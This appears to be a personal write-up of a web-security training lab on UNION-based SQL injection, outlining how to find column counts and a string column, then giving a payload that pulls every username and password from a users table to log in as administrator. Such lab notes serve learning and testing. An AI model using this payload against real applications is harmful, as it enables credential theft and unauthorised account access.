# Retrieving multiple values in a single column
#WRITEUP 
#UNION 

The scenario is similar to [[retrieving data from other tables writeup]]

## 1. Determine the number of columns of the result set 


![[columns.png]]


## 2. Determine which columns can hold string data
The second column can hols string data

![[string column.png]]

## 3. Craft and inject the payload

Given that only one of the columns can hols string data use the technique explained on [[Retrieving multiple values within a single column]] to retrieve sensitive data.

The payload is as follows:

```SQL
' UNION SELECT NULL,username || '~' || password FROM users--
```

Remember that ONLY the second column of the result set can hold string data. The lab context mentions that the table and columns exist in the database.

![[credentials.png]]

Once injected the credentials for all users are retrieved.

Log in as `administrator` to solve the lab!

![[solved.png]]